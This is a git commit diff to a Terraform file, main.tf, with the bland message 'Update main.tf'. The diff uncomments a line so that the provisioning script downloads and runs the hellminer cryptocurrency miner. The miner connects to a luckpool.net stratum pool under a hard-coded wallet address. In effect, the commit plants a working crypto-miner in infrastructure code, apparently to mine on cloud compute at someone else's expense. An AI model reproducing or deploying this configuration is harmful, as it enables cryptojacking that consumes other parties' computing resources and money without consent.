e43636a4ddc50f5d944ce50470b190d55c231289
mooghen01-hue <chriskm0101@outlook.com>
2026-01-09 20:14:12 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -6,7 +6,7 @@ tar -xzvf hellminer_linux64.tar.gz
 mkdir mining
 mv hellminer mining/hellminer
 mv verus-solver mining/verus-solver
-#./hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
+./mining/hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
 ls mining
 EOT
   }
